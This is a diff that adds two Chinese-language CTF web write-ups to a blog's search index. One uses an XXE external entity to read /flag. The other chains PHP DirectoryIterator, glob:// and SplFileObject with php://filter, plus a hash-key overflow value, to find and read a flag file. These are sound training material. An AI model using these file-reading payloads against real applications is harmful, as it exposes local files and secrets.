@@ -839,4 +839,87 @@
         <tag>web</tag>
       </tags>
   </entry>
+  <entry>
+    <title>(NCTF2019)Fake XML cookbook</title>
+    <url>/2022/07/02/%5BNCTF2019%5DFake%20XML%20cookbook/</url>
+    <content><![CDATA[<p>点击进入题目是一个登陆界面</p>
+<img src="/2022/07/02/%5BNCTF2019%5DFake%20XML%20cookbook/image-20220702215745447.png" class="" title="image-20220702215745447">
+
+
+
+<p>结合题目xml时就猜想有没有可能时xxe，抓包看一下</p>
+<img src="/2022/07/02/%5BNCTF2019%5DFake%20XML%20cookbook/image-20220702215820564.png" class="" title="image-20220702215820564">
+
+<p>果不其然引用了外部实体所以是xxe无疑了</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY admin SYSTEM &quot;file:///flag&quot;&gt; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<p>获得flag：</p>
+<img src="/2022/07/02/%5BNCTF2019%5DFake%20XML%20cookbook/image-20220702220019235.png" class="" title="image-20220702220019235">
+
+<h2 id="tip"><a href="#tip" class="headerlink" title="tip"></a>tip</h2><p>因为这题有回显所以直接命令执行即可出flag（flag的位置一般ctf题中都是在根目录下所以直接查找&#x2F;flag即可）</p>
+]]></content>
+      <categories>
+        <category>刷题</category>
+        <category>web题集</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>(catf1agCTF)我幽默吗?</title>
+    <url>/2022/07/01/catf1agCTF%E6%88%91%E5%B9%BD%E9%BB%98%E5%90%97/</url>
+    <content><![CDATA[<p>进入题目：</p>
+<p>发现是空白页面，点击万能的f12发现注释中果然藏了东西</p>
+<img src="/2022/07/01/catf1agCTF%E6%88%91%E5%B9%BD%E9%BB%98%E5%90%97/image-20220701205934697.png" class="" title="image-20220701205934697">
+
+<p>仔细观察发现是一个密码本，进行对照翻译</p>
+<img src="/2022/07/01/catf1agCTF%E6%88%91%E5%B9%BD%E9%BB%98%E5%90%97/image-20220701210012170.png" class="" title="image-20220701210012170">
+
+<p>发现提示了一个source，在url中传入source&#x3D;xxxx（任意值进行尝试）获得以下代码：</p>
+<img src="/2022/07/01/catf1agCTF%E6%88%91%E5%B9%BD%E9%BB%98%E5%90%97/image-20220701210259854.png" class="" title="image-20220701210259854">
+
+<p>仔细阅读后发现总共要传入三个值a，b，c</p>
+<p>之后对flag文件位置进行查询：</p>
+<p>payload：a&#x3D;DirectoryIterator&amp;b&#x3D;glob:&#x2F;&#x2F;flag[a-z0-9]*.php&amp;c&#x3D;9223372036854775806</p>
+<img src="/2022/07/01/catf1agCTF%E6%88%91%E5%B9%BD%E9%BB%98%E5%90%97/image-20220701214011951.png" class="" title="image-20220701214011951">
+
+
+
+<p>获取flag</p>
+<p>payload：a&#x3D;SplFileObject&amp;b&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag56ea8b83122449e814e0fd7bfb5f220a.php&amp;c&#x3D;9223372036854775806</p>
+<img src="/2022/07/01/catf1agCTF%E6%88%91%E5%B9%BD%E9%BB%98%E5%90%97/image-20220701214053812.png" class="" title="image-20220701214053812">
+
+
+
+<p>解密获得最终结果：</p>
+<img src="/2022/07/01/catf1agCTF%E6%88%91%E5%B9%BD%E9%BB%98%E5%90%97/image-20220701210702783.png" class="" title="image-20220701210702783">
+
+
+
+<h2 id="get新知识"><a href="#get新知识" class="headerlink" title="get新知识"></a>get新知识</h2><p>当出现类似如下代码时可以利用原生类配合php伪协议使用获取flag</p>
+<img src="/2022/07/01/catf1agCTF%E6%88%91%E5%B9%BD%E9%BB%98%E5%90%97/image-20220701210422844.png" class="" title="image-20220701210422844">
+
+<h3 id="glob协议"><a href="#glob协议" class="headerlink" title="glob协议"></a>glob协议</h3><p>   glob:&#x2F;&#x2F;协议是php5.3.0以后一种<strong>查找匹配的文件路径模式</strong>。（后面可以使用正则表达式匹配）</p>
+<h3 id="遍历目录类（DirectoryIterator）"><a href="#遍历目录类（DirectoryIterator）" class="headerlink" title="遍历目录类（DirectoryIterator）"></a>遍历目录类（DirectoryIterator）</h3><p>​    DirectoryIterator类的<code>__construct</code>方法会构造一个迭代器，如果使用echo输出该迭代器，将会返回迭代器的第一项</p>
+<p>与之类似的还有FilesystemIterator和GlobIterator（自带glob头在使用时不需要在使用glob协议直接正则即可）在DirectoryIterator被禁用的情况下可以使用；</p>
+<p><em><strong>所以我们可以将glob协议和DirectoryIterator类配合使用达到查询的效果</strong></em></p>
+<h2 id="读取文件类（SplFileObject）"><a href="#读取文件类（SplFileObject）" class="headerlink" title="读取文件类（SplFileObject）"></a>读取文件类（SplFileObject）</h2><p>SplFileObject类为文件提供了一个面向对象接口</p>
+<p>在读取过程中不一定会成功所以可以配合filter协议使用；</p>
+<h2 id="绕过-count-x3D-1（不理解记住即可）"><a href="#绕过-count-x3D-1（不理解记住即可）" class="headerlink" title="绕过$count[]&#x3D;1（不理解记住即可）"></a>绕过$count[]&#x3D;1（不理解记住即可）</h2><p>重点在于$count[] &#x3D; 1此语句正常赋值的时候返回结果为1</p>
+<p>可以通过溢出来跳出此语句的判断</p>
+<p>作为PHP最重要的数据类型HashTable其key值是有一定的范围的，如果设置的key值过大就会出现溢出的问题而这个数字就是临界点9223372036854775807</p>
+<p>特别鸣谢大佬博客：</p>
+<p><a href="https://blog.csdn.net/cng_Sinner/article/details/123345424">(19条消息) 我幽默吗？_king_Sinner的博客-CSDN博客</a></p>
+<p><a href="https://blog.csdn.net/qq_38154820/article/details/121112935">(19条消息) 记一道2021浙江省赛的Web题_合天网安实验室的博客-CSDN博客</a></p>
+]]></content>
+      <categories>
+        <category>刷题</category>
+        <category>web题集</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
 </search>
